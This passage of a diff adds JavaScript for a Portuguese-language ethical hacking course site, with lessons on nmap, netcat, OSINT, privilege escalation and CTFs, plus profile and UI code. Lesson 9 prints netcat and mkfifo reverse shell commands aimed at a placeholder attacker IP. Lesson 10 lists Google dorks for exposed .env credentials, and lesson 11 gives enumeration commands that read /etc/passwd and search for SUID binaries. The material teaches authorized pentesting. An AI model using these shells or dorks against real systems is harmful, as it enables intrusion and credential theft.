+cb('bash','<span class="ck">nmap</span> <span class="cf">-p 80,443</span> <span class="cv">target</span>       <span class="cm"># portas específicas</span>\n<span class="ck">nmap</span> <span class="cf">-p-</span> <span class="cv">target</span>              <span class="cm"># TODAS as 65535</span>\n<span class="ck">nmap</span> <span class="cf">-F</span> <span class="cv">target</span>               <span class="cm"># fast: top 100</span>\n<span class="ck">nmap</span> <span class="cf">-sV</span> <span class="cv">target</span>              <span class="cm"># versão dos serviços</span>\n<span class="ck">nmap</span> <span class="cf">-sV -sC</span> <span class="cv">target</span>         <span class="cm"># + scripts default</span>\n<span class="ck">nmap</span> <span class="cf">-A</span> <span class="cv">target</span>               <span class="cm"># tudo: versão+OS+scripts</span>')
+)+
+sec(3,'NSE Scripts',
+cb('bash','<span class="ck">nmap</span> <span class="cf">--script vuln</span> <span class="cv">target</span>                 <span class="cm"># vulnerabilidades</span>\n<span class="ck">nmap</span> <span class="cf">--script</span> <span class="cv">http-title -p 80</span> <span class="cv">target</span>    <span class="cm"># título web</span>\n<span class="ck">nmap</span> <span class="cf">--script</span> <span class="cv">smb-vuln-ms17-010</span> <span class="cv">target</span>  <span class="cm"># EternalBlue</span>\n<span class="ck">nmap</span> <span class="cf">--script</span> <span class="cv">ftp-anon -p 21</span> <span class="cv">target</span>    <span class="cm"># FTP anónimo</span>')
+)+
+ex('<span class="ck">pkg install</span> <span class="cv">nmap</span>\n<span class="ck">nmap</span> <span class="cf">-sV -sC</span> <span class="cv">scanme.nmap.org</span>\n<span class="ck">nmap</span> <span class="cf">-F -T4</span> <span class="cv">scanme.nmap.org</span>');
+}
+
+// ──── AULA 9 ────
+function bL9(){
+return '<div class="lc-eyebrow">Módulo 2 · Redes</div>'+
+'<h1 class="lc-h1">Netcat e reconhecimento de serviços</h1>'+
+'<div class="lc-intro">Netcat é chamado o canivete suíço da rede. Ligações TCP/UDP, banner grabbing, transferir ficheiros, e a base de shells remotas.</div>'+
+sec(1,'Banner grabbing',
+cb('bash','<span class="ck">pkg install</span> <span class="cv">netcat-openbsd</span>\n\n<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">target.com</span> <span class="cf">22</span>   <span class="cm"># SSH banner</span>\n<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">target.com</span> <span class="cf">21</span>   <span class="cm"># FTP banner</span>\n<span class="ck">nmap</span> <span class="cf">--script=banner</span> <span class="cv">target</span>        <span class="cm"># via nmap</span>')
+)+
+sec(2,'Reverse Shell — conceito fundamental',
+cb('bash','<span class="cm"># Atacante (fica à escuta):</span>\n<span class="ck">nc</span> <span class="cf">-lvnp</span> <span class="cf">4444</span>\n\n<span class="cm"># Vítima (envia shell para atacante):</span>\n<span class="ck">nc</span> <span class="cv">IP_ATACANTE</span> <span class="cf">4444</span> <span class="cf">-e</span> /bin/bash\n\n<span class="cm"># Versão sem -e:</span>\n<span class="ck">mkfifo</span> /tmp/f; <span class="ck">cat</span> /tmp/f | /bin/bash <span class="cf">-i</span> <span class="cs">2>&1</span> | <span class="ck">nc</span> <span class="cv">IP</span> <span class="cf">4444</span> <span class="cf">></span> /tmp/f')+
+danger('⚖️','Uso ético apenas — ','Shells reversas são técnicas legítimas em pentest autorizado. Sem autorização = crime.')
+)+
+ex('<span class="ck">pkg install</span> <span class="cv">netcat-openbsd</span>\n<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">scanme.nmap.org</span> <span class="cf">22</span>');
+}
+
+// ──── AULA 10 ────
+function bL10(){
+return '<div class="lc-eyebrow">Módulo 3 · Pentesting</div>'+
+'<h1 class="lc-h1">Metodologia de Pentest e OSINT</h1>'+
+'<div class="lc-intro">Antes de tocar num único pacote, um pentester passa horas em reconhecimento passivo. OSINT pode revelar mais do que qualquer scanner.</div>'+
+sec(1,'Fases do Pentest',
+tbl(['Fase','Ferramentas','Output'],[['1. Recon Passivo','Whois, Google, crt.sh','IPs, subdomínios, emails'],['2. Scanning','Nmap, Nikto','Portas, versões'],['3. Exploração','Metasploit','Acesso inicial'],['4. Pós-exploração','LinPEAS','Root, hashes'],['5. Relatório','Markdown','Documento']])+
+tip('📋','Regras de Engagement — ','Sempre ter contrato assinado, escopo definido, IPs autorizados e janela de tempo.')
+)+
+sec(2,'Google Dorks',
+cb('dorks','<span class="co">site:empresa.pt                → só páginas do domínio</span>\n<span class="co">site:empresa.pt filetype:pdf   → PDFs</span>\n<span class="co">intitle:"login" site:empresa   → páginas de login</span>\n<span class="co">filetype:env DB_PASSWORD       → .env expostos!</span>\n<span class="co">site:pastebin.com "empresa"    → dados vazados</span>',false)+
+hack(' Google dorks encontram ficheiros .env com credenciais de produção regularmente em bug bounty.')
+)+
+sec(3,'WHOIS e DNS recon',
+cb('bash','<span class="ck">pkg install</span> <span class="cv">whois</span>\n<span class="ck">whois</span> <span class="cv">empresa.pt</span>           <span class="cm"># dono, datas, nameservers</span>\n<span class="ck">dig</span> <span class="cv">empresa.pt ANY</span>         <span class="cm"># todos os registos DNS</span>\n<span class="ck">curl</span> <span class="cs">"https://crt.sh/?q=%.empresa.pt&output=json"</span>')
+)+
+ex('<span class="ck">pkg install</span> <span class="cv">whois</span>\n<span class="ck">whois</span> <span class="cv">nmap.org</span>\n<span class="ck">dig</span> <span class="cv">nmap.org ANY</span>');
+}
+
+// ──── AULA 11 ────
+function bL11(){
+return '<div class="lc-eyebrow">Módulo 4 · Scripts</div>'+
+'<h1 class="lc-h1">Enumeração e privilege escalation</h1>'+
+'<div class="lc-intro">Após obter acesso inicial, a enumeração local é o próximo passo — perceber onde estás, quem és, o que podes fazer e como escalar privilégios.</div>'+
+sec(1,'Script de enumeração',
+cb('bash','<span class="ck">#!/bin/bash</span>\n<span class="ck">echo</span> <span class="cs">"═══ SYSTEM ═══"</span>; <span class="ck">uname</span> <span class="cf">-a</span>\n<span class="ck">echo</span> <span class="cs">"═══ USER ═══"</span>; <span class="ck">id</span>; <span class="ck">sudo</span> <span class="cf">-l</span> <span class="cs">2>/dev/null</span>\n<span class="ck">echo</span> <span class="cs">"═══ USERS ═══"</span>\n<span class="ck">grep</span> <span class="cf">-v</span> <span class="cs">"nologin\\|false"</span> /etc/passwd | <span class="ck">cut</span> <span class="cf">-d: -f1</span>\n<span class="ck">echo</span> <span class="cs">"═══ SUID ═══"</span>\n<span class="ck">find</span> / <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span>\n<span class="ck">echo</span> <span class="cs">"═══ NETWORK ═══"</span>\n<span class="ck">ss</span> <span class="cf">-tlnp</span>')+
+hack(' LinPEAS (github.com/carlospolop/PEASS-ng) é a versão profissional com 500+ verificações.')
+)+
+sec(2,'Vectores de escalação',
+tbl(['Vector','Como explorar'],[['SUID binários','<code>find / -perm -4000</code> → verificar GTFOBins'],['sudo mal configurado','<code>sudo -l</code> → NOPASSWD em editor = shell root'],['Cron jobs','Scripts writable em cron = command injection'],['PATH hijacking','Script usa comando sem caminho absoluto']])
+)+
+ex('<span class="ck">id</span>\n<span class="ck">sudo</span> <span class="cf">-l</span> <span class="cs">2>/dev/null</span>\n<span class="ck">find</span> / <span class="cf">-perm -4000 -user root -type f</span> <span class="cs">2>/dev/null</span>\n<span class="ck">cat</span> /etc/crontab <span class="cs">2>/dev/null</span>');
+}
+
+// ──── AULA 12 ────
+function bL12(){
+return '<div class="lc-eyebrow">Módulo 5 · CTF</div>'+
+'<h1 class="lc-h1">CTF — Capture The Flag</h1>'+
+'<div class="lc-intro">CTF são competições onde resolves desafios de segurança para obter "flags". São a melhor forma de praticar hacking ético legalmente e no teu próprio ritmo.</div>'+
+sec(1,'O que é um CTF?',
+cb('ctf','<span class="co">Formato típico: HTB{s0me_r4nd0m_str1ng}</span>\n\n<span class="co">Categorias:</span>\n<span class="co">  Web       → SQLi, XSS, File Upload, IDOR</span>\n<span class="co">  Pwn       → Buffer overflow, ROP chains</span>\n<span class="co">  Crypto    → Quebrar cifras</span>\n<span class="co">  Forensics → Analisar ficheiros, pcaps</span>\n<span class="co">  Reversing → Engenharia reversa</span>\n<span class="co">  Misc      → Steganography, OSINT</span>',false)
+)+
+sec(2,'Plataformas recomendadas',
+tbl(['Plataforma','URL','Tipo'],[['HackTheBox','hackthebox.com','Máquinas Linux/Windows'],['TryHackMe','tryhackme.com','Guiado para iniciantes'],['PicoCTF','picoctf.org','Gratuito, iniciante'],['CTFtime','ctftime.org','Calendário de competições']])+
+tip('🏁','Começa aqui — ','TryHackMe tem paths guiados para iniciantes. HackTheBox quando já tens os fundamentos.')
+)+
+sec(3,'Metodologia para máquinas Linux',
+cb('bash','<span class="cm"># 1. Recon</span>\n<span class="ck">nmap</span> <span class="cf">-sV -sC -p-</span> <span class="cv">TARGET_IP</span>\n\n<span class="cm"># 2. Após acesso inicial</span>\n<span class="ck">id</span>; <span class="ck">sudo</span> <span class="cf">-l</span>; <span class="ck">find</span> / <span class="cf">-perm -4000</span> <span class="cs">2>/dev/null</span>\n\n<span class="cm"># 3. Flags</span>\n<span class="ck">cat</span> <span class="cs">~/user.txt</span>\n<span class="ck">cat</span> /root/root.txt')
+)+
+ex('<span class="cm"># Cria conta no TryHackMe:</span>\n<span class="cm"># 1. Completa "Pre-Security" path (gratuito)</span>\n<span class="cm"># 2. "Linux Fundamentals" rooms</span>\n<span class="cm"># 3. Primeira máquina: "Basic Pentesting"</span>');
+}
+
+// ═══════════════ COPY CODE ═══════════════
+function cpCode(btn) {
+  var code = btn.closest('.cb').querySelector('.cb-body');
+  var text = code.innerText.trim();
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(text).then(function(){
+      btn.textContent = '✓ ok';
+      btn.style.color = '#00f5a0';
+      setTimeout(function(){ btn.textContent = 'copiar'; btn.style.color = ''; }, 2000);
+    });
+  } else {
+    toast('Selecciona o código manualmente', '');
+  }
+}
+
+// ═══════════════ PROFILE ═══════════════
+var ALL_BADGES = [
+  {id:'welcome',ico:'👋',name:'Bem-vindo'},
+  {id:'first_lesson',ico:'📚',name:'1ª Aula'},
+  {id:'three_lessons',ico:'🔥',name:'3 Aulas'},
+  {id:'module1_complete',ico:'🏆',name:'Módulo 1'},
+  {id:'ten_lessons',ico:'💎',name:'10 Aulas'},
+  {id:'hacker',ico:'🎯',name:'Hacker'}
+];
+
+function loadProfile() {
+  if (!USER) return;
+  document.getElementById('p-name').textContent = USER.username;
+  document.getElementById('p-email').textContent = USER.email;
+  var token = getToken();
+  Promise.all([
+    fetch('/api/stats', {headers:{'Authorization':'Bearer '+token}}).then(function(r){ return r.json() }),
+    fetch('/api/badges', {headers:{'Authorization':'Bearer '+token}}).then(function(r){ return r.json() })
+  ]).then(function(results){
+    var stats = results[0];
+    var badges = results[1];
+    BADGES = badges;
+    document.getElementById('p-lessons').textContent = stats.completed_lessons || 0;
+    document.getElementById('p-badges').textContent = stats.badges_earned || 0;
+    document.getElementById('p-pct').textContent = Math.round((stats.completed_lessons||0)/LESSONS.length*100) + '%';
+    var grid = document.getElementById('badges-grid');
+    grid.innerHTML = ALL_BADGES.map(function(b){
+      var earned = badges.find(function(ub){ return ub.badge_id === b.id });
+      return '<div class="badge-card '+(earned?'earned':'locked')+'">'+
+        '<div class="badge-ico">'+b.ico+'</div>'+
+        '<div class="badge-nm">'+b.name+'</div>'+
+        '<div class="badge-dt">'+(earned ? new Date(earned.earned_at).toLocaleDateString('pt') : 'Bloqueado')+'</div>'+
+      '</div>';
+    }).join('');
+  }).catch(function(){});
+}
+
+// ═══════════════ TOAST ═══════════════
+function toast(msg, type) {
+  var t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast ' + (type||'') + ' show';
+  setTimeout(function(){ t.classList.remove('show') }, 3000);
+}
+
+// ═══════════════ INIT ═══════════════
+(function(){
+  var token = localStorage.getItem('tl_token');
+  var user = localStorage.getItem('tl_user');
+  if (token && user) {
+    try {
+      USER = JSON.parse(user);
+      document.getElementById('nav-user').textContent = USER.username;
+      document.getElementById('p-name').textContent = USER.username;
+      document.getElementById('p-email').textContent = USER.email;
+      go('lessons');
+    } catch(e) {
+      go('home');
+    }
+  } else {
+    go('home');
   }
 })();
 </script>
